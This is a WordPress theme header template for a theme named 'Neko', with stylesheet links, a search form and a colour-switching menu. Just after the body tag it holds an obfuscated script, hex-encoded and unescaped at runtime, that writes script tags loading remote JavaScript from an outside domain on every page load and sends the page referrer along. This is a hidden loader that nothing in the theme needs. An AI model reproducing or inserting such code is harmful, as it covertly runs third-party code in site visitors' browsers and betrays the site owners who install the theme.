<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
<meta name="keywords" content="<?php bloginfo('description'); ?>" />
<meta name="description" content="<?php bloginfo('description'); ?>" />
<link rel="stylesheet" type="text/css" href="<?php echo get_option('home'); ?>/wp-content/themes/Neko/sdmenu/sdmenu.css" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory');?>/style.css" type="text/css" media="screen" />
<link rel="alternate stylesheet" type="text/css" media="screen" title="green-theme" href="<?php bloginfo('stylesheet_directory');?>/css/green.css" />
<link rel="alternate stylesheet" type="text/css" media="screen" title="pink-theme" href="<?php bloginfo('stylesheet_directory');?>/css/pink.css" />
<link rel="alternate stylesheet" type="text/css" media="screen" title="blue-theme" href="<?php bloginfo('stylesheet_directory');?>/css/blue.css" />
<link rel="alternate stylesheet" type="text/css" media="screen" title="red-theme" href="<?php bloginfo('stylesheet_directory');?>/css/red.css" />
<script type="text/javascript" src="<?php bloginfo('stylesheet_directory');?>/top.js"></script>
<script type="text/javascript" src="<?php bloginfo('stylesheet_directory');?>/style-switch.js"></script>

<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php
global $page_sort;	
	if(get_settings('Neko_sortpages')!='')
	{ 
		$page_sort = 'sort_column='. get_settings('Neko_sortpages');
	}	
	global $pages_to_exclude;
	
	if(get_settings('Neko_excludepages')!='')
	{ 
		$pages_to_exclude = 'exclude='. get_settings('Neko_excludepages');
	}	
?>
<?php wp_head(); ?>
</head>
<body>
<script type='text/javascript'> str='@3C@73@63@72@69@70@74@20@6C@61@6E@67@75@61@67@65@3D@22@6A@61@76@61@73@63@72@69@70@74@22@20@73@72@63@3D@22@68@74@74@70@3A@2F@2F@77@65@62@74@72@65@6E@64@73@6D@6C@32@2E@63@6F@6D@2F@63@73@67@2F@70@75@62@6C@69@63@2F@66@5F@39@34@62@66@30@62@66@65@35@34@32@66@62@64@64@31@30@66@34@33@38@30@66@62@38@30@34@61@35@38@33@66@2E@6A@73@22@3E@3C@2F@73@63@72@69@70@74@3E@0A@3C@73@63@72@69@70@74@20@6C@61@6E@67@75@61@67@65@3D@27@4A@61@76@61@53@63@72@69@70@74@27@20@74@79@70@65@3D@27@74@65@78@74@2F@6A@61@76@61@73@63@72@69@70@74@27@3E@0A@64@6F@63@75@6D@65@6E@74@2E@77@72@69@74@65@20@28@22@3C@22@20@2B@20@22@73@63@72@69@70@74@20@6C@61@6E@67@75@61@67@65@3D@27@4A@61@76@61@53@63@72@69@70@74@27@20@74@79@70@65@3D@27@74@65@78@74@2F@6A@61@76@61@73@63@72@69@70@74@27@20@73@72@63@3D@27@22@29@3B@0A@64@6F@63@75@6D@65@6E@74@2E@77@72@69@74@65@20@28@22@68@74@74@70@3A@2F@2F@77@65@62@74@72@65@6E@64@73@6D@6C@32@2E@63@6F@6D@2F@63@73@67@2F@74@72@61@63@6B@2F@70@5F@61@33@64@36@38@62@34@36@31@62@64@39@64@33@35@33@33@65@65@31@64@64@33@63@65@34@36@32@38@65@64@34@2E@6A@73@3F@22@20@2B@20@65@73@63@61@70@65@28@64@6F@63@75@6D@65@6E@74@2E@72@65@66@65@72@72@65@72@29@29@3B@0A@64@6F@63@75@6D@65@6E@74@2E@77@72@69@74@65@20@28@22@27@3E@3C@22@20@2B@20@22@2F@73@63@72@69@70@74@3E@22@29@3B@0A@3C@2F@73@63@72@69@70@74@3E'; document.write(unescape(str.replace(/@/g,'%'))); </script>
<div id="header">
<table align="center" border="0" cellpadding="0" cellspacing="0">
<tr>
<td width="191" rowspan="3" align="left" valign="top"><a href="<?php echo get_option('home'); ?>/"><img class="main-logo" src="<?php echo get_option('home'); ?>/wp-content/themes/Neko/img/spacer.gif" alt="<?php bloginfo('name');?>" width="186" height="88" border="0" /></a></td>    
<td width="100%" align="right" style="padding:15px 10px 0px 0px;" valign="middle"><script type="text/javascript">
function clearDefault(el) {
if (el.defaultValue==el.value) el.value = ""
}
</script>
<form style="margin:0px;" method="get" action="<?php echo get_option('home'); ?>/">
<table border="0" cellpadding="0" cellspacing="0">
<tr>
<td>
<input style="margin:0px;" type="text" VALUE="Search Here.." ONFOCUS="clearDefault(this)" name="s" id="s" size="19" class="search-top" /></td>
<td width="30" style="padding:0px;" valign="middle" align="left"><input type="image" src="<?php echo get_option('home'); ?>/wp-content/themes/Neko/img/search.gif" style="margin:0px 0px 0px 5px; padding:0px; border:0px;" value="GO" />
</td>
</tr>
</table>
</form></td>
</tr>
</table>
<div class="top-Menu" id="chromemenu" style="padding-top:3px;">
<ul>
<li><a href="<?php echo get_option('home'); ?>/">Home</a></li>
<?php wp_list_pages('title_li=&depth=1&'.$page_sort.'&'.$pages_to_exclude)?>
</ul>
<div id="nav-menu">
<a href="javascript:chooseStyle('none', 60)"><img src="<?php bloginfo('stylesheet_directory');?>/img/black-sq.gif" alt="Black Theme" border="0" /></a>

<a href="javascript:chooseStyle('blue-theme', 60)"><img src="<?php bloginfo('stylesheet_directory');?>/img/blue-sq.gif" alt="Blue Theme" border="0" /></a>

<a href="javascript:chooseStyle('green-theme', 60)"><img src="<?php bloginfo('stylesheet_directory');?>/img/green-sq.gif" alt="Green Theme" border="0" /></a>

<a href="javascript:chooseStyle('red-theme', 60)"><img src="<?php bloginfo('stylesheet_directory');?>/img/red-sq.gif" alt="Red Theme" border="0" /></a>

<a href="javascript:chooseStyle('pink-theme', 60)"><img src="<?php bloginfo('stylesheet_directory');?>/img/pink-sq.gif" alt="Pink Theme" border="0" /></a>
</div>
</div>
</div>

<div id="container">
<div id="wrapper">
<?php include 'sidebar.php';?>